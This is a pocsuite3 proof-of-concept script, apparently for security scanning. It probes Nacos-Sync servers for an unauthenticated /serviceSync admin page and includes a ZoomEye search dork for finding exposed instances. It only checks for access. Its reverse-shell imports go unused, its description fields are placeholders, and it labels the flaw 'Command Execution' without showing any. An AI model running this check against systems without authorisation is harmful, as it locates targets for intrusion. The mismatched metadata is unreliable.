from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Nacos未授权进后台'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'title:"nacos" title:"Nacos-Sync"'}

    def _verify(self):
        vuln_path = '/serviceSync'
        url = urljoin(self.url, vuln_path)
        res = requests.get(url, verify=False, timeout=5)
        if res.status_code == 200 and 'login' not in res.text:
            result = {'VerifyInfo': {'url': self.url}}
            return self.parse_output(result)


register_poc(POC)
